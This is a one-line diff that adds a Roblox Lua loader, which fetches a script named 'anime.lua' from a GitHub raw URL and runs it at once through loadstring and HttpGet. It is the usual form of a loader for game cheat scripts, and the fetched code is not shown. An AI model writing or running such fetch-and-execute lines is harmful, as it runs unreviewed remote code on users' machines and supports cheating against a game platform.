@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vbbdv3/lost/main/anime.lua", true))()
